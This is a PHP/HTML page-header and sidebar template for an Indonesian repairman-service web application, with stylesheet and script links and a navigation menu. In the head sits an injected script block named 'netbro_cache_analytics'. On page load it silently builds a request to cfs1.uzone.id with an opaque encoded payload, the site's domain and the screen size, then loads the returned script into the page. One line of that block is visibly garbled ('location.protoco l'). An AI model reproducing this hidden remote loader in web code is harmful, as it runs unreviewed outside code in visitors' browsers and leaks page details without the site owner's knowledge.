<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!-->

<html class="no-js">
<!--<![endif]-->

<head>
    <title><?=$title; ?></title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    
    <!-- Custom Fonts -->
    <link href="<?=base_url("/asset/font-awesome/css/font-awesome.min.css")?>" rel="stylesheet" type="text/css">

    <!-- Animate CSS by Daniel Eden-->
    <link href="<?=base_url("asset/plugin/bootstrap-notify-3.1.3/animate.css");?>" rel="stylesheet" type="text/css">
    <script src="<?=base_url("/asset/javascript/jquery-1.12.4.min.js")?>"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="<?=base_url("asset/bootstrap/3.3.7/js/bootstrap.min.js")?>"></script>
    <!-- Favicon -->
    <link rel="shortcut icon" href="<?=base_url("asset/img/favicon.ico")?>" type="image/x-icon">
    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="<?=base_url("asset/plugins/bootstrap/css/bootstrap.min.css")?>">
    <!-- Fonts  -->
    <link rel="stylesheet" href="<?=base_url("asset/css/font-awesome.min.css")?>">
    <link rel="stylesheet" href="<?=base_url("asset/css/simple-line-icons.css")?>">
    <!-- Switchery -->
    <link rel="stylesheet" href="<?=base_url("asset/plugins/switchery/switchery.min.css")?>">
    <!-- CSS Animate -->
    <link rel="stylesheet" href="<?=base_url("asset/css/animate.css")?>">
    <!-- Custom styles for this theme -->
    <link rel="stylesheet" href="<?=base_url("asset/css/main.css")?>">
    <!-- Feature detection -->
    <script src="<?=base_url("asset/js/vendor/modernizr-2.6.2.min.js")?>"></script>
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="assets/js/vendor/html5shiv.js"></script>
    <script src="assets/js/vendor/respond.min.js"></script>
    <![endif]-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
    <link href="<?=base_url("asset/plugin/bootstrap-notify-3.1.3/animate.css");?>" rel="stylesheet" type="text/css">
    <script src="<?=base_url("asset/js/vendor/jquery-1.11.1.min.js")?>"></script>
    <script src="<?=base_url("asset/plugins/bootstrap/js/bootstrap.min.js")?>"></script>
    <script src="<?=base_url("asset/plugins/navgoco/jquery.navgoco.min.js")?>"></script>
    <script src="<?=base_url("asset/plugins/switchery/switchery.min.js")?>"></script>
    <script src="<?=base_url("asset/plugins/pace/pace.min.js")?>"></script>
      <script src="<?=base_url("asset/plugins/fullscreen/jquery.fullscreen-min.js")?>"></script>
    <script src="<?=base_url("asset/js/src/app.js")?>"></script>
<script type="text/javascript">
if (self==top) {
    function netbro_cache_analytics(fn, callback) 
    {
        setTimeout(
            function() {
                fn();
                callback();
                }, 
                0
        );
    }
    
    function sync(fn) 
    {
        fn();
    }
    function requestCfs()
    {
        var idc_glo_url = (location.protoco l== "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random()*99999999999);
        var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKo3mE%2fGaaTKVo6uAa97BTXVwSww15sQZ%2bBuzaubn5n8dE3vd2%2fahLP4WkD4V0eHzXWE%2fNIc2IBqs8wytcKK3%2fRDXvJaAp5c6CFSLEBbfyi3cWorb789vzFzuY8IfK6XfTKhNkPSPijqvB3lfELVy85yuQIKeZey6bfY6smo%2bN6bHPzwjQsAeHNoqjCEZRvl1a7gm%2f1WcmSI0xNfIMJtjDjDp4YWXWEr3UlUcKhu%2biPs7QESaXeDWA2%2fFLcgT4dlbqhdOsjl2SdMVqi40hQITkRqeqJHUCYbT40DdbC0LHc4xWRxGsxZTU4x66GpXdoQrvbwyDCkeN%2byE%2f8F8yh60iEL8gj1TvDHsXUAOmWY8ljINtwf8PHGoqnmpn9aYIfT4Kb%2f7c5aZ3Um%2bo%2fmETWTVr7k4QU4PU1EChMZ9gUlx61wTWEDJ4YsW8dp3xF4o9EF5AteBFc4kjbjKgVl3j%2brApWFtIjZUyapXfrD77%2fj69oSCjs3iSohnEN9UaMGbLkr2Lv06Trdey09Ihl2glV1QL7jF4Aj4NjZ31SK%2bnF4DtChxCrtqxCQ2KhGXtniL7cbcR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function(){});
};
</script>
</head>

<style>
    .sidebar-fixed-position
    {
        position: fixed;
    }
    div.username
    {
        width: 200px;
        text-align: center;
    }
    .username a
    {
        display: block;
        padding: 21px 0;
    }
    .user-avatar img
    {
        height: 80%;
        margin: 10%;
    }
    .logout-nav
    {
        position: absolute;
        left: 0;
        bottom: 15px;
        right: 0;
    }
</style>

<body>
    <section id="main-wrapper" class="theme-blue-full">
        <header id="header">
            <!--logo start-->
            <div class="brand">
                <a href="<?=base_url("user/viewhome")?>" class="logo">
                    <i class="icon-layers"></i>
                    <span>SERVER</span>Medan</a>
            </div>
            <!--logo end-->
            <ul class="nav navbar-nav navbar-left">
                <li class="toggle-navigation toggle-left">
                    <button class="sidebar-toggle" id="toggle-left">
                        <i class="fa fa-bars"></i>
                    </button>
                </li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <li class="toggle-navigation toggle-right">
                    <div class="user-avatar">
                        <img class="img-circle profile-image" src="assets/img/profile.jpg" alt="profile">
                    </div>
                </li>
                <li class="toggle-navigation toggle-right">
                    <div class="profile-body dropdown username">
                        <a href="<?=base_url("user/profile")?>" class="username"><h4>Nama Repairman</h4></a>
                    </div>
                </li>
                <li class="toggle-fullscreen hidden-xs">
                    <button type="button" class="btn btn-default expand" id="toggle-fullscreen">
                        <i class="fa fa-expand"></i>
                    </button>
                </li>
                <!--Note: Chatting
                    
                    <li class="toggle-navigation toggle-right">
                    <button class="sidebar-toggle" id="toggle-right">
                        <i class="fa fa-indent"></i>
                    </button>
                </li>-->
            </ul>
        </header>
        <!--sidebar left start-->
        <aside class="sidebar sidebar-left sidebar-fixed-position">
            <nav>
                <h5 class="sidebar-header">Menu</h5>
                <ul class="nav nav-pills nav-stacked">
                    <li>
                        <a href="<?=base_url("user/user_login_customer")?>" title="Beranda">
                            <i class="fa  fa-fw fa-home"></i> Beranda
                        </a>
                    </li>
                    <li>
                        <a href="<?=base_url("user/profile")?>" title="Profil">
                            <i class="fa  fa-fw fa-user"></i> Profil
                        </a>
                    </li>
                    <li class="nav-dropdown">
                        <a href="<?=base_url("")?>" title="Progresss and History">
                            <i class="fa  fa-fw fa-cogs"></i> Progress and History
                        </a>
                    </li>
                    <li>
                        <a href="<?=base_url("user/rank")?>" title="List Repairman">
                            <i class="fa  fa-fw fa-trophy"></i> List Repairman
                        </a>
                    </li>
                    




                    <li>
                        <a href="<?=base_url("news")?>" title="Berita">
                            <i class="fa  fa-fw fa-newspaper-o"></i> Berita
                        </a>
                    </li>
                </ul>
            </nav>
            <?php
                if(user_login_info()["is_repairman"] != null)
                {
            ?>
            <nav>
                <h5 class="sidebar-header">Repairman</h5>
                <ul class="nav nav-pills nav-stacked">
                    <li>
                        <a href="<?=base_url("user/user_login_repair")?>" title="Beranda Repairman">
                            <i class="fa  fa-fw fa-tachometer"></i> Beranda Repairman
                        </a>
                    </li>
                    <li>
                        <a href="<?=base_url("repairman/profile")?>" title="Profil Repairman">
                            <i class="fa  fa-fw fa-user-plus"></i> Profil Repairman
                        </a>
                    </li>
					<li class="nav-dropdown">
                        <a href="#" title="Pengaturan Iklan">
                            <i class="fa  fa-fw fa-object-group"></i> Pengaturan Iklan
                        </a>
                        <ul class="nav-sub">
                            <li>
                                <a href="<?=base_url("repairman/pasang_banner")?>">
                                    <i class="fa fa-fw fa-picture-o"></i> Lihat Iklan
                                </a>
                            </li>
                            <li>
                                <a href="<?=base_url("repairman/pasang_banner")?>">
                                    <i class="fa fa-fw fa-plus-square"></i> Pasang Iklan
                                </a>
                            </li>
                        </ul>
                    </li>
                    <li class="nav-dropdown">
                        <a href="#" title="Job Progress">
                            <i class="fa  fa-fw fa-tasks"></i> Job Progress
                        </a>
                        <ul class="nav-sub">
                            <li>
                                <a href="<?=base_url("repairman/job_repository?id=0")?>">
                                    <i class="fa fa-fw fa-clock-o"></i> Sedang Berlangsung
                                </a>
                            </li>
                            <li>
                                <a href="<?=base_url("repairman/job_repository?id=1")?>">
                                    <i class="fa fa-fw fa-check"></i> Selesai
                                </a>
                            </li>
                            <li>
                                <a href="<?=base_url("repairman/job_repository?id=2")?>">
                                    <i class="fa fa-fw fa-gear"></i> Open
                                </a>
                            </li>
                            <li>
                                <a href="<?=base_url("repairman/job_repository?id=3")?>">
                                    <i class="fa fa-fw fa-times"></i> Ditolak
                                </a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <?php
                }
            ?>
            <nav class="logout-nav">
                <ul class="nav nav-pills nav-stacked">
                    <li>
                        <a href="<?=base_url("user/logout")?>" title="Keluar">
                            <i class="fa  fa-fw fa-power-off"></i> Logout
                        </a>
                    </li>
                </ul>
            </nav>
        </aside>
        <!--sidebar left end-->